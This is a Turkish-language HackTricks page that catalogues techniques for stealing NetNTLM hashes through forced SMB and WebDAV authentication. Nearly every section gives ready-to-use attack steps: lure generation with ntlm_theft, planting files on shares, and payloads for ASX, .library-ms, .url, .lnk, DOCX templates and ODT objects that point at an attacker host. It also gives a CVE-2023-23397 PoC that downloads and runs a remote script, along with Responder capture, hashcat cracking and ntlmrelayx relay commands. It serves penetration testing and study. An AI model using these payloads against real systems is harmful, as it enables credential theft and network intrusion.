# NTLM kimlik bilgilerini çalınabilecek yerler

{{#include ../../banners/hacktricks-training.md}}

**Microsoft Word dosyasını çevrimiçi indirmekten NTLM leaks kaynağına kadar pek çok harika fikri şu kaynaklarda inceleyin: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Yazılabilir SMB paylaşımı + Explorer ile tetiklenen UNC tuzakları (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

**Kullanıcıların veya zamanlanmış işlerin Explorer'da gezindiği bir paylaşıma yazabiliyorsanız**, metadata'sı sizin UNC yolunuza işaret eden dosyalar bırakın (ör. `\\ATTACKER\share`). Klasörün görüntülenmesi **örtük SMB kimlik doğrulamasını** tetikler ve listener'ınıza **NetNTLMv2** sızdırır.<sup>[[1]](#references)</sup>

1. **Tuzakları oluşturun** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF vb. destekler)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Onları yazılabilir paylaşıma bırakın** (kurbanın açtığı herhangi bir klasör):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Dinle ve kır**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows aynı anda birkaç dosyaya erişebilir; Explorer'ın önizlediği her şey (`BROWSE TO FOLDER`) için tıklama gerekmez.

### Windows Media Player çalma listeleri (.ASX/.WAX)

Hedefin, denetiminizdeki bir Windows Media Player çalma listesini açmasını veya önizlemesini sağlayabilirseniz, girdiyi bir UNC path'e yönlendirerek Net-NTLMv2'yi leak edebilirsiniz. WMP, başvurulan medyayı SMB üzerinden almaya çalışır ve kimlik doğrulamasını örtük olarak gerçekleştirir.<sup>[[3]](#references)[[4]](#references)</sup>

Örnek payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Toplama ve cracking akışı:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP içine gömülü .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, ZIP arşivi içinden doğrudan açılan .library-ms dosyalarını güvenli olmayan şekilde işler. Library tanımı uzak bir UNC yolunu (ör. `\\attacker\share`) gösteriyorsa, ZIP içindeki .library-ms dosyasına göz atmak/açmak Explorer'ın UNC yolunu enumerate etmesine ve saldırgana NTLM kimlik doğrulama bilgilerini göndermesine neden olur. Böylece çevrimdışı olarak kırılabilecek veya potansiyel olarak relay edilebilecek bir NetNTLMv2 elde edilir.<sup>[[2]](#references)</sup>

Saldırgan UNC yolunu gösteren minimal .library-ms

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Operasyonel adımlar
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname değerlerinizi ayarlayın).
- Dosyayı ZIP’leyin (Windows’ta: Gönder → Sıkıştırılmış (ZIP’lenmiş) klasör) ve ZIP dosyasını hedefe iletin.
- Bir NTLM capture listener çalıştırın ve kurban ZIP’in içindeki .library-ms dosyasını açana kadar bekleyin.


### Outlook takvim anımsatıcı sesi yolu (CVE-2023-23397) – sıfır tıklamayla Net-NTLMv2 leak

Microsoft Outlook for Windows, takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter’ı işler. Bu özellik bir UNC yolunu (ör. \\attacker\share\alert.wav) gösteriyorsa, anımsatıcı tetiklendiğinde Outlook SMB paylaşımına bağlanarak kullanıcının Net-NTLMv2’sini herhangi bir tıklama olmadan leak ediyordu. Bu açık 14 Mart 2023’te yamalandı; ancak eski/güncellenmemiş sistem filoları ve geçmişe dönük olay müdahalesi açısından hâlâ oldukça önemlidir.<sup>[[5]](#references)</sup>

PowerShell ile hızlı exploitation (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Listener tarafı:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notlar
- Hatırlatıcı tetiklendiğinde kurbanın yalnızca Outlook for Windows uygulamasını çalıştırıyor olması yeterlidir.
- leak, çevrimdışı kırma veya relay için uygun Net‑NTLMv2 verir (pass-the-hash için değil).


### .LNK/.URL simge tabanlı zero-click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 atlatması)

Windows Explorer, kısayol simgelerini otomatik olarak işler. Yakın tarihli araştırmalar, Microsoft’un UNC simgeli kısayollar için Nisan 2025’te yayımladığı yamaya rağmen kısayol hedefini bir UNC path üzerinde barındırıp simgeyi yerel tutarak hâlâ tıklama gerektirmeden NTLM kimlik doğrulamasını tetiklemenin mümkün olduğunu gösterdi (yama atlatmasına CVE‑2025‑50154 atandı). Klasörü yalnızca görüntülemek bile Explorer’ın uzak hedeften metadata almasına ve saldırganın SMB server’ına NTLM göndermesine neden olur.<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShell ile Program Kısayolu payload'ı (.lnk):

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Teslimat fikirleri
- Kısayolu bir ZIP dosyasına koyun ve kurbanın ZIP dosyasına göz atmasını sağlayın.
- Kısayolu, kurbanın açacağı yazılabilir bir paylaşıma yerleştirin.
- Öğelerin Explorer'da önizlenmesi için aynı klasöre başka yem dosyaları da ekleyin.

### ExtraData simge yolu üzerinden tıklama gerektirmeyen .LNK NTLM leak (CVE‑2026‑25185)

Windows, `.lnk` meta verilerini yalnızca çalıştırma sırasında değil, **görünüm/önizleme** sırasında da (simge oluşturulurken) yükler. CVE‑2026‑25185, **ExtraData** bloklarının kabuğun bir simge yolunu çözümlemesine ve yükleme **sırasında** dosya sistemine erişmesine neden olduğu bir ayrıştırma yolunu gösterir; yol uzak bir konumdaysa dışarı NTLM gönderilir.

Temel tetikleme koşulları (`CShellLink::_LoadFromStream` içinde gözlemlendi):
- ExtraData'ya **DARWIN_PROPS** (`0xa0000006`) ekleyin (simge güncelleme yordamına geçiş koşulu).
- **TargetUnicode** alanı doldurulmuş bir **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) ekleyin.
- Yükleyici, `TargetUnicode` içindeki ortam değişkenlerini genişletir ve ortaya çıkan yol üzerinde `PathFileExistsW` çağırır.

`TargetUnicode` bir UNC yoluna (ör. `\\attacker\share\icon.ico`) çözülürse, kısayolun bulunduğu klasörü **yalnızca görüntülemek** bile dışarıya kimlik doğrulaması yapılmasına neden olur. Aynı yükleme yolu **indeksleme** ve **AV taraması** sırasında da tetiklenebilir; bu da burayı tıklama gerektirmeyen pratik bir leak yüzeyi hâline getirir.<sup>[[7]](#references)</sup>

Bu yapıları Windows GUI'sini kullanmadan oluşturmak/incelemek için araştırma araçları (parser/generator/UI), **LnkMeMaybe** projesinde mevcuttur.<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie` üzerinden WebDAV kimlik doğrulama zorlaması / kimlik bilgisi doğrulaması

Yerel **WebDAV client**, geçerli oturum açma oturumunu rastgele bir **HTTP/WebDAV** uç noktasına kimlik doğrulaması yapmaya zorlamak için kötüye kullanılabilir:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Neden kullanışlı:
- **Saldırganın kontrolündeki bir WebDAV sunucusuna** karşı, özel bir client bırakmadan **HTTP üzerinden NTLM** tetikleyebilir.
- **Dahili host'lara** karşı, lateral movement'a geçmeden önce **çalınan kimlik bilgilerinin nerelerde kabul edildiğini doğrulamanın** sessiz bir yoludur.<sup>[[9]](#references)</sup>
- **SMB egress** filtrelenmiş ancak **HTTP/WebDAV** hâlâ erişilebilir durumdaysa bu komut iyi bir alternatiftir.

Operasyonel notlar:
- Kaynak host'ta **WebClient** hizmeti çalışıyor olmalıdır.
- `rundll32.exe`, `davclnt.dll` dosyasını yükler ve Windows'un **mevcut kullanıcının kimlik bilgilerini** kullanarak WebDAV kimlik doğrulamasını gerçekleştirmesini sağlar.<sup>[[10]](#references)</sup>
- Kontrol ettiğiniz altyapıya yönlendiriyorsanız, NTLM destekleyen bir HTTP listener/relay kullanın; örneğin:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Tespit açısından, birçok dahili sisteme karşı tekrarlanan `rundll32.exe davclnt.dll,DavSetCookie` çalıştırmaları, normal kullanıcı davranışından ziyade **kimlik bilgisi doğrulama / spray benzeri yanal hareket hazırlığı** için güçlü bir göstergedir.<sup>[[9]](#references)[[11]](#references)</sup>

### WebDAV NTLM coercion için uzak bildirim URI'leri

Bir uygulama uzaktan yapılandırılmış popup veya web görünümü adreslerini dereference ediyorsa, `file://` adresi **belge açmadan veya çalıştırılabilir bir payload kullanmadan** giden kimlik doğrulamayı zorlayabilir. AOMEI vakasında tek piksellik bir bildirim, uzak bir `DavWWWRoot` WebDAV yolunu gösteriyordu. Windows bu adrese tümleşik kimlik doğrulaması yapmaya çalışarak bir NetNTLMv2 challenge-response bilgisini açığa çıkardı. Tetikleyici popup'ın görünürlüğü değil, URI'nin dereference edilmesiydi; bu yöntem yine de uygulamanın URI işleyicisine, [Windows WebClient davranışına](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) ve giden kimlik doğrulama ilkesine bağlıdır.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

Komut tabanlı yukarıdaki zorlamadan farklı olarak, bu giriş noktası bir [software notification configuration](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger) üzerinde denetim gerektirir. Tek piksellik pencere ve yüksek öncelik, dikkat çekmeyen bir bildirimin bile istemcinin URI'yi dereference etmesini sağlayabileceğini gösterir.<sup>[[16]](#references)</sup>

### Office remote template injection (.docx/.dotm) ile NTLM'i zorlama

Office belgeleri harici bir şablona başvurabilir. Ekli şablonu bir UNC path olarak ayarlarsanız, belge açıldığında SMB'ye kimlik doğrulaması yapılır.

Minimal DOCX ilişki değişiklikleri (word/ içinde):

1) word/settings.xml dosyasını düzenleyin ve ekli şablon başvurusunu ekleyin:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'ü UNC yolunuza yönlendirin:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) .docx olarak yeniden paketleyip teslim edin. SMB yakalama listener'ınızı çalıştırın ve belgenin açılmasını bekleyin.

### SMB kimlik doğrulaması için ODT harici nesnesi

Belge yükleme yolu `.odt` dosyalarını kabul ediyor ancak hedef Office `.docx` dosyalarını açmıyorsa, Office şablonu yerine bir OpenDocument harici nesnesi kullanın. Metasploit'in `auxiliary/fileformat/odt_badodt` modülü, `content.xml` dosyasında aşağıdaki gibi bir yükleme sırasında `draw:object` başvurusu içeren bir ODT oluşturur. `LHOST` değerini SMB listener'ınıza ayarlayın, ODT'yi izin verilen iş akışı üzerinden yükleyin ve bir kullanıcı veya belge işlemcisi dosyayı açtığında giden NetNTLMv2 yanıtını yakalayın. Dosya adı uzantısı denetimi bu gömülü URL'yi incelemez; hedefteki gelen NTLM kısıtlamaları giden kimlik doğrulamayı mutlaka engellemez.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Post-capture'ta NTLM'i relay etme veya kötüye kullanma fikirleri için şuraya bakın:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Yazılabilir paylaşım tuzakları + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 ile DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → Webroot'a NTFS junction ile RCE → FullPowers + GodPotato ile SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM güvenlik açığı: Microsoft'ta yamanmamış yetki yükseltme tehditleri](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft, Outlook EoP'yi (CVE‑2023‑23397) azaltıyor ve PidLidReminderFileParameter üzerinden NTLM leak'i açıklıyor](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, tek bir NTLM: Microsoft güvenlik yaması atlatma (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 incelemesi](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe araçları](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT desteği aradığında: Teams'ten etki alanının ele geçirilmesine uzanan ModeloRAT kampanyasının incelenmesi](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h üstbilgisi](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV isteği](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Netntlm hash'lerini çalmak için ilgi çekici noktalar](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — ODT harici nesne NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group ve Mandiant – Geçici tedarik zinciri kurcalamasının incelenmesi](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
